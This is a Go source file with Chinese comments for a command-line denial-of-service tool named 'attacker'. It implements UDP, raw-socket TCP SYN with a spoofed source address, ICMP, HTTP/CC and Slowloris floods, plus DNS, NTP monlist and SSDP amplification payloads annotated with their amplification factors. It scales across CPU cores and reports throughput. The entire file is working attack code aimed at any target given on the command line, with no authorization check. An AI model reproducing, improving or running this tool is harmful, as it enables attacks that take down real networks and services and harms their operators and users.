package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ==================== 全局统计 ====================
var (
	statPPS   int64 // 包/秒
	statBytes int64 // 已发送字节
	statConns int64 // 活动连接数
	startTime time.Time
)

// ==================== 统计输出 ====================
func statsLoop() {
	prevPPS := int64(0)
	prevBytes := int64(0)
	for {
		time.Sleep(2 * time.Second)
		p := atomic.LoadInt64(&statPPS)
		b := atomic.LoadInt64(&statBytes)
		pps := p - prevPPS
		mbps := (b - prevBytes) * 8 / (2 * 1000 * 1000)
		prevPPS = p
		prevBytes = b
		elapsed := int(time.Since(startTime).Seconds())
		out := map[string]interface{}{
			"pps":    pps,
			"mbps":   mbps,
			"conns":  atomic.LoadInt64(&statConns),
			"elapsed": elapsed,
			"sent":   b,
		}
		data, _ := json.Marshal(out)
		fmt.Println(string(data))
	}
}

// ==================== UDP Flood ====================
func udpWorker(c *net.UDPConn, packet []byte, deadline time.Time, stopCh chan bool) {
	for {
		select {
		case <-stopCh:
			return
		default:
		}
		if time.Now().After(deadline) {
			return
		}
		n, err := c.Write(packet)
		if err == nil {
			atomic.AddInt64(&statBytes, int64(n))
			atomic.AddInt64(&statPPS, 1)
		}
	}
}

func udpFlood(target string, port int, concurrency int, bandwidth int, packetSize int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}
	packet := make([]byte, packetSize)
	rand.Read(packet)
	deadline := time.Now().Add(duration)
	var wg2 sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		c, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}
		c.SetWriteBuffer(1 << 20)
		wg2.Add(1)
		go func(conn *net.UDPConn) {
			defer wg2.Done()
			defer conn.Close()
			udpWorker(conn, packet, deadline, stopCh)
		}(c)
	}
	atomic.AddInt64(&statConns, int64(concurrency))
	wg2.Wait()
}

// ==================== TCP SYN Flood（raw socket） ====================
func tcpSynFlood(target string, port int, concurrency int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	// 解析目标 IP
	ip := net.ParseIP(target)
	if ip == nil {
		addrs, err := net.LookupIP(target)
		if err != nil || len(addrs) == 0 {
			return
		}
		ip = addrs[0]
	}
	dstIP := ip.To4()
	if dstIP == nil {
		return
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Fprintf(os.Stderr, "raw socket 失败(需root): %v\n", err)
		return
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	deadline := time.Now().Add(duration)
	var seed uint32 = uint32(rand.Int31())
	var srcIP [4]byte
	srcIP[0], srcIP[1], srcIP[2], srcIP[3] = 10, 0, byte(rand.Intn(255)), byte(rand.Intn(255))
	for {
		select {
		case <-stopCh:
			syscall.Close(fd)
			return
		default:
		}
		if time.Now().After(deadline) {
			syscall.Close(fd)
			return
		}
		seed++
		// 构造 TCP SYN 包
		srcPort := uint16(1024 + (seed % 60000))
		pkt := buildTCPSYN(srcIP, dstIP, srcPort, uint16(port), seed)
		sockaddr := &syscall.SockaddrInet4{Port: port}
		copy(sockaddr.Addr[:], dstIP)
		err := syscall.Sendto(fd, pkt, 0, sockaddr)
		if err == nil {
			atomic.AddInt64(&statBytes, int64(len(pkt)))
			atomic.AddInt64(&statPPS, 1)
		}
	}
}

func buildTCPSYN(srcIP [4]byte, dstIP []byte, srcPort, dstPort uint16, seq uint32) []byte {
	pkt := make([]byte, 40)
	// IP 头 (20字节)
	pkt[0] = 0x45
	pkt[1] = 0
	pkt[2], pkt[3] = 0, 40
	copy(pkt[12:16], srcIP[:])
	copy(pkt[16:20], dstIP)
	pkt[9] = syscall.IPPROTO_TCP
	// TCP 头 (20字节)
	pkt[20], pkt[21] = byte(srcPort>>8), byte(srcPort)
	pkt[22], pkt[23] = byte(dstPort>>8), byte(dstPort)
	pkt[24], pkt[25], pkt[26], pkt[27] = byte(seq>>24), byte(seq>>16), byte(seq>>8), byte(seq)
	pkt[32] = 0x50 // 数据偏移
	pkt[33] = 0x02 // SYN
	// IP 校验和
	sum := ipChecksum(pkt[0:20])
	pkt[10], pkt[11] = byte(sum>>8), byte(sum)
	// TCP 校验和（伪头）
	pseudo := make([]byte, 12)
	copy(pseudo[0:4], srcIP[:])
	copy(pseudo[4:8], dstIP)
	pseudo[8], pseudo[9] = 0, 6
	pseudo[10], pseudo[11] = 0, 20
	sum = checksum(append(append(pseudo, pkt[20:40]...), 0, 0))
	pkt[36], pkt[37] = byte(sum>>8), byte(sum)
	return pkt
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data); i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	for sum > 0xffff {
		sum = (sum >> 16) + (sum & 0xffff)
	}
	return ^uint16(sum)
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum >> 16) + (sum & 0xffff)
	}
	return ^uint16(sum)
}

// ==================== ICMP Flood（raw socket） ====================
func icmpFlood(target string, concurrency int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	ip := net.ParseIP(target)
	if ip == nil {
		addrs, err := net.LookupIP(target)
		if err != nil || len(addrs) == 0 {
			return
		}
		ip = addrs[0]
	}
	conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: ip})
	if err != nil {
		fmt.Fprintf(os.Stderr, "raw icmp 失败: %v\n", err)
		return
	}
	deadline := time.Now().Add(duration)
	payload := make([]byte, 56)
	rand.Read(payload)
	var id uint16 = uint16(rand.Intn(65535))
	for {
		select {
		case <-stopCh:
			conn.Close()
			return
		default:
		}
		if time.Now().After(deadline) {
			conn.Close()
			return
		}
		seq := uint16(rand.Intn(65535))
		pkt := buildICMP(id, seq, payload)
		n, err := conn.Write(pkt)
		if err == nil {
			atomic.AddInt64(&statBytes, int64(n))
			atomic.AddInt64(&statPPS, 1)
		}
	}
}

func buildICMP(id, seq uint16, payload []byte) []byte {
	pkt := make([]byte, 8+len(payload))
	pkt[0] = 8 // echo request
	copy(pkt[4:6], []byte{byte(id >> 8), byte(id)})
	copy(pkt[6:8], []byte{byte(seq >> 8), byte(seq)})
	copy(pkt[8:], payload)
	sum := icmpChecksum(pkt)
	pkt[2], pkt[3] = byte(sum>>8), byte(sum)
	return pkt
}

func icmpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum >> 16) + (sum & 0xffff)
	}
	return ^uint16(sum)
}

// ==================== HTTP/CC Flood ====================
func httpFlood(target string, port int, concurrency int, path string, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	url := fmt.Sprintf("http://%s:%d%s", target, port, path)
	deadline := time.Now().Add(duration)
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: concurrency,
			DisableKeepAlives:   false,
		},
		Timeout: 10 * time.Second,
	}
	var wg2 sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg2.Add(1)
		go func() {
			defer wg2.Done()
			for {
				select {
				case <-stopCh:
					return
				default:
				}
				if time.Now().After(deadline) {
					return
				}
				resp, err := client.Get(url)
				if err == nil {
					resp.Body.Close()
					atomic.AddInt64(&statPPS, 1)
				}
			}
		}()
	}
	wg2.Wait()
}

// ==================== 慢速连接（Slowloris，占用连接不释放） ====================
func slowloris(target string, port int, concurrency int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	deadline := time.Now().Add(duration)
	requestHeader := "GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0\r\n"
	var wg2 sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg2.Add(1)
		go func() {
			defer wg2.Done()
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 10*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()
			conn.Write([]byte(requestHeader))
			atomic.AddInt64(&statConns, 1)
			defer atomic.AddInt64(&statConns, -1)
			// 每隔 10 秒发一个字节保持连接
			for {
				select {
				case <-stopCh:
					return
				default:
				}
				if time.Now().After(deadline) {
					return
				}
				conn.Write([]byte("X"))
				time.Sleep(10 * time.Second)
			}
		}()
	}
	wg2.Wait()
}

// ==================== 放大器（DNS/NTP/SSDP） ====================
func ampFlood(target string, port int, ampType string, concurrency int, duration time.Duration, stopCh chan bool, wg *sync.WaitGroup) {
	defer wg.Done()
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}
	var payload []byte
	switch ampType {
	case "dns":
		// DNS ANY 查询（放大 ~28x）
		payload = buildDNSQuery()
	case "ntp":
		// NTP monlist（放大 ~556x）
		payload = append([]byte{0x17, 0x00, 0x03, 0x2a}, make([]byte, 4)...)
	case "ssdp":
		payload = []byte("M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n")
	default:
		return
	}
	deadline := time.Now().Add(duration)
	conns := make([]*net.UDPConn, concurrency)
	for i := 0; i < concurrency; i++ {
		c, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}
		conns[i] = c
	}
	for {
		select {
		case <-stopCh:
			for _, c := range conns {
				if c != nil {
					c.Close()
				}
			}
			return
		default:
		}
		if time.Now().After(deadline) {
			for _, c := range conns {
				if c != nil {
					c.Close()
				}
			}
			return
		}
		for _, c := range conns {
			if c == nil {
				continue
			}
			n, err := c.Write(payload)
			if err == nil {
				atomic.AddInt64(&statBytes, int64(n))
				atomic.AddInt64(&statPPS, 1)
			}
		}
	}
}

func buildDNSQuery() []byte {
	id := rand.Intn(65535)
	q := make([]byte, 0)
	q = append(q, byte(id>>8), byte(id))
	q = append(q, 0x01, 0x00) // RD
	q = append(q, 0x00, 0x01) // QDCOUNT=1
	q = append(q, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	// 查询域名 ANY
	q = append(q, 0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e')
	q = append(q, 0x03, 'c', 'o', 'm')
	q = append(q, 0x00)
	q = append(q, 0x00, 0xff) // QTYPE=ANY
	q = append(q, 0x00, 0x01) // QCLASS=IN
	return q
}

// ==================== main ====================
func main() {
	target := flag.String("target", "", "目标 IP/域名")
	port := flag.Int("port", 80, "目标端口")
	mode := flag.String("mode", "udp", "模式: udp/tcp/http/icmp/slowloris/cc/dns/ntp/ssdp")
	duration := flag.Int("duration", 60, "时长(秒)")
	concurrency := flag.Int("concurrency", 100, "并发")
	bandwidth := flag.Int("bandwidth", 0, "限速 Mbps (0=不限)")
	packet := flag.Int("packet", 1024, "包大小(字节)")
	path := flag.String("path", "/", "HTTP 路径")
	flag.Parse()

	if *target == "" {
		fmt.Println("用法: attacker -target IP -port 80 -mode udp -duration 60 -concurrency 100")
		return
	}

	startTime = time.Now()
	stopCh := make(chan bool)
	// 捕获 Ctrl+C
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		close(stopCh)
	}()

	go statsLoop()

	var wg sync.WaitGroup
	dur := time.Duration(*duration) * time.Second
	// 并行分片到多核
	cores := runtime.NumCPU()
	if *concurrency < cores {
		cores = *concurrency
	}
	perCore := *concurrency / cores
	if perCore < 1 {
		perCore = 1
	}

	switch *mode {
	case "udp":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go udpFlood(*target, *port, perCore, *bandwidth, *packet, dur, stopCh, &wg)
		}
	case "tcp", "syn":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go tcpSynFlood(*target, *port, perCore, dur, stopCh, &wg)
		}
	case "icmp":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go icmpFlood(*target, perCore, dur, stopCh, &wg)
		}
	case "http", "cc":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go httpFlood(*target, *port, perCore, *path, dur, stopCh, &wg)
		}
	case "slowloris":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go slowloris(*target, *port, perCore, dur, stopCh, &wg)
		}
	case "dns", "ntp", "ssdp":
		for i := 0; i < cores; i++ {
			wg.Add(1)
			go ampFlood(*target, *port, *mode, perCore, dur, stopCh, &wg)
		}
	default:
		fmt.Println("未知模式:", *mode)
		return
	}

	wg.Wait()
	fmt.Println(`{"done":true}`)
}